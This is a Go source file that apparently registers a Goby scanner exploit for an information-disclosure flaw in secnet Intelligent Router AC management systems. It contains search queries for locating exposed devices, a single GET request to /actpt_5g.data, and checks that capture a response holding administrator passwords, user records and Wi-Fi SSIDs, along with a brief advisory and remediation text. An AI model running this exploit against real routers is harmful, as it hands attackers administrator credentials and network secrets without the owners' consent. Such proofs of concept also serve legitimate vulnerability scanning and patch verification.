package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "secnet Intelligent Router actpt_5g.data Infoleakage",
    "Description": "<p>secnet Intelligent AC management system is the wireless AP management system of Guangzhou Secure Network Communication Technology Co., LTD. (\" Secure Network Communication \"for short). The secnet intelligent AC management system has information vulnerabilities, which can be used by attackers to obtain sensitive information.</p>",
    "Product": "secnet-Intelligent-Router",
    "Homepage": "http://www.secnet.cn/",
    "DisclosureDate": "2022-12-08",
    "Author": "afei_00123@foxmail.com",
    "FofaQuery": "title=\"安网-智能路由系统\" || title==\"智能路由系统\" || title=\"安网科技-智能路由系统\" || banner=\"HTTPD_ac 1.0\" || header=\"HTTPD_ac 1.0\"",
    "GobyQuery": "title=\"安网-智能路由系统\" || title==\"智能路由系统\" || title=\"安网科技-智能路由系统\" || banner=\"HTTPD_ac 1.0\" || header=\"HTTPD_ac 1.0\"",
    "Level": "2",
    "Impact": "<p>An attacker can use this vulnerability to obtain the WEB login account and password of the AC intelligent routing system and obtain the WEB administrator permission. As a result, sensitive information is leaked.</p>",
    "Recommendation": "<p>1. It is recommended to do a good job of access control permissions.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access on security devices such as firewalls.</p>",
    "References": [
        "https://afei00123.blog.csdn.net/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/actpt_5g.data",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ap_info",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "passwd",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ssids",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user_info",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/actpt_5g.data",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ssids",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "passwd",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ap_info",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user_info",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "secnet-智能路由系统 actpt_5g.data 信息泄露",
            "Product": "secnet-智能路由系统",
            "Description": "<p>secnet安网智能AC管理系统是广州安网通信技术有限公司（简称“安网通信”）的无线AP管理系统。secnet安网智能AC管理系统存在信息漏洞，攻击者可利用该漏洞获取敏感信息。</p>",
            "Recommendation": "<p>1、建议做好访问控制权限。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可利用该漏洞获取AC智能路由系统WEB登录账号密码，登录AC智能路由系统获取WEB管理员权限，从而造成敏感信息泄露。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "secnet Intelligent Router actpt_5g.data Infoleakage",
            "Product": "secnet-Intelligent-Router",
            "Description": "<p>secnet Intelligent AC management system is the wireless AP management system of Guangzhou Secure Network Communication Technology Co., LTD. (\" Secure Network Communication \"for short). The secnet intelligent AC management system has information vulnerabilities, which can be used by attackers to obtain sensitive information.</p>",
            "Recommendation": "<p>1. It is recommended to do a good job of access control permissions.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access on security devices such as firewalls.</p>",
            "Impact": "<p>An attacker can use this vulnerability to obtain the WEB login account and password of the AC intelligent routing system and obtain the WEB administrator permission. As a result, sensitive information is leaked.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}